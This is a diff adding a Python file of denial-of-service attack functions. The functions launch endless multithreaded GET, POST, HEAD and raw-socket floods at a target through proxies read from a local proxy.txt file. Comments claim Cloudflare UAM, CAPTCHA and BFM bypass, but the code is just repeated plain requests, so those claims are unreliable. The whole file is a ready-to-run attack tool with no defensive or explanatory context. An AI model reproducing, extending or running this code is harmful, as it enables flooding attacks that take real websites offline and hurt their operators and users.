@@ -1,0 +1,224 @@
+import os
+import threading
+import time
+import httpx
+import socks
+import socket
+
+def check_proxy_file():
+    if not os.path.exists("./proxy.txt"):
+        print("\033[91m [*] You Need Proxy File ( ./proxy.txt )\033[0m")
+        return False
+    return True
+
+def get_proxies():
+    return open("./proxy.txt", "r").read().splitlines()
+
+# Proxy Bypass CF UAM, CAPTCHA, BFM (request)
+def pxcfreq(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxcfreq Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        while True:
+            try:
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                with httpx.Client(proxies=proxies, timeout=10) as client:
+                    client.get(target)
+                    print(f"[+] pxcfreq GET via {proxy}")
+            except Exception:
+                pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy Bypass CF BFM (socket)
+def pxcfb_soc(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxcfb-soc Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        try:
+            ip, port = proxy.split(':')
+            sock = socks.socksocket()
+            sock.set_proxy(socks.SOCKS5, ip, int(port))
+            sock.connect((target, 80))
+            while True:
+                sock.send(b"GET / HTTP/1.1\r\nHost: "+target.encode()+b"\r\n\r\n")
+                print(f"[+] pxcfb-soc sent packet via {proxy}")
+        except Exception:
+            pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy Get Request Attack
+def pxget(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxget Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        while True:
+            try:
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                with httpx.Client(proxies=proxies, timeout=10) as client:
+                    client.get(target)
+                    print(f"[+] pxget GET via {proxy}")
+            except Exception:
+                pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy Post Request Attack
+def pxpost(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxpost Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        while True:
+            try:
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                with httpx.Client(proxies=proxies, timeout=10) as client:
+                    client.post(target)
+                    print(f"[+] pxpost POST via {proxy}")
+            except Exception:
+                pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy Head Request Attack
+def pxhead(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxhead Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        while True:
+            try:
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                with httpx.Client(proxies=proxies, timeout=10) as client:
+                    client.head(target)
+                    print(f"[+] pxhead HEAD via {proxy}")
+            except Exception:
+                pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy PPS Attack (Only GET / HTTP/1.1)
+def pxpps(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxpps Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        try:
+            ip, port = proxy.split(':')
+            sock = socks.socksocket()
+            sock.set_proxy(socks.SOCKS5, ip, int(port))
+            sock.connect((target, 80))
+            packet = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n"
+            while True:
+                sock.send(packet)
+                print(f"[+] pxpps sent packet via {proxy}")
+        except Exception:
+            pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy Spoof Attack (assuming it already exists, but add proxy support)
+def pxspoof(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxspoof Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        while True:
+            try:
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                with httpx.Client(proxies=proxies, timeout=10) as client:
+                    client.get(target)
+                    print(f"[+] pxspoof GET via {proxy}")
+            except Exception:
+                pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy Socket Attack
+def pxsoc(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxsoc Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        try:
+            ip, port = proxy.split(':')
+            sock = socks.socksocket()
+            sock.set_proxy(socks.SOCKS5, ip, int(port))
+            sock.connect((target, 80))
+            while True:
+                sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+                print(f"[+] pxsoc sent packet via {proxy}")
+        except Exception:
+            pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
+
+# Proxy Raw Attack (you can customize depending on your raw attack method)
+def pxraw(target, t, timer):
+    if not check_proxy_file():
+        return
+    proxys = get_proxies()
+    print(f"\033[92m [*] pxraw Attack Started On {target} With {t} Threads Using Proxy\033[0m")
+
+    def attack(proxy):
+        try:
+            ip, port = proxy.split(':')
+            sock = socks.socksocket()
+            sock.set_proxy(socks.SOCKS5, ip, int(port))
+            sock.connect((target, 80))
+            # Customize your raw payload here:
+            raw_payload = b"RAW PAYLOAD HERE\r\n\r\n"
+            while True:
+                sock.send(raw_payload)
+                print(f"[+] pxraw sent raw packet via {proxy}")
+        except Exception:
+            pass
+
+    for i in range(int(t)):
+        proxy = proxys[i % len(proxys)]
+        threading.Thread(target=attack, args=(proxy,), daemon=True).start()
+    time.sleep(timer)
